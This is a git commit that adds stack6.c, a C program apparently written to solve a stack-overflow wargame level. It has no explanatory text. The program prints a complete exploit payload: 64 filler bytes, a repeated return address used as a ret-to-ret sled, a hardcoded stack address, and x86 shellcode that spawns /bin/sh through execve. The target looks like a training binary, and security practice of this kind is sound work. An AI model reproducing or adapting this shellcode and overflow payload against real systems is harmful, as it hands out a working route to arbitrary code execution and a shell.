d96a3083a366662073e379371c5a2e198d631542
Mimoja <max-schander@freenet.de>
2017-03-15 17:58:32 +0100

    stack 6 with limited return address space

---
+++ stack6.c
@@ -0,0 +1,29 @@
+#include <stdio.h>
+
+int main(void){
+    //buffer
+    for(int i = 0; i < 64 ; i++){
+        printf("A");
+    }
+
+    // return to the return of main
+    int payload = 0x08048508;
+    // 4 addresses padding before the return pointer
+    for(int bruteforce = 0; bruteforce < 45; bruteforce++){
+      for(int i = 0; i < 4 ; i++){
+          printf("%c", ((char*)&payload)[i]);
+      }
+    }
+
+    int finalreturn = 0xbffff7b0+4;
+    for(int i = 0; i < 4 ; i++){
+        printf("%c", ((char*)&finalreturn)[i]);
+    }
+
+    char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
+                      "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
+    for(int i = 0; i < strlen(shellcode); i++){
+      printf("%c", (shellcode)[i]);
+    }
+    return 0;
+}
